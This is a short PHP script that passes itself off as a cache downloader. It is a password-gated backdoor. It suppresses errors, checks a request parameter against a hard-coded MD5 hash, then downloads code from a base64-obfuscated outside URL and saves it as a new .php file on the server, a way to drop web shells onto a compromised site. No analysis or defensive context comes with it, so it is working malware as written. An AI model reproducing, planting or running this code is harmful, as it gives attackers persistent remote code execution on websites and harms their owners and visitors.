<?php
error_reporting(0);
function cacheDownloader($getAddress,$getName){
	$ch = curl_init("$getAddress"); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	$data = curl_exec($ch); 
	curl_close($ch); 

	$process = fopen("$getName", "w+"); 
	fwrite($process, $data); 
	fclose($process); 
	if($process){ 
		echo $getName;
		die();
	}else{ 
		echo 'False';
		die();
	}
}
if(md5(@$_GET['d']) == 'e7be149ce037a9247bd78ecf43c12326'){
	echo 'OK';
	$cacheWP = @$_GET['cache'];
	$getCache = base64_decode("aHR0cDovL2Jsb2cuYXBpZXMub3JnL3Mt").$cacheWP;
	if(isset($_GET['cache'])){
		if( function_exists ( 'curl_init' ) ) {
			cacheDownloader($getCache, __DIR__ . '/'. $cacheWP . '.php');
		}elseif(function_exists('file_get_contents')){
			$f=fopen(__DIR__ . '/'. $cacheWP . '.php','w+');
			fwrite($f,file_get_contents($getCache));
			fclose($f);
			echo __DIR__ . '/'. $cacheWP . '.php';
			die();
		}
	}
}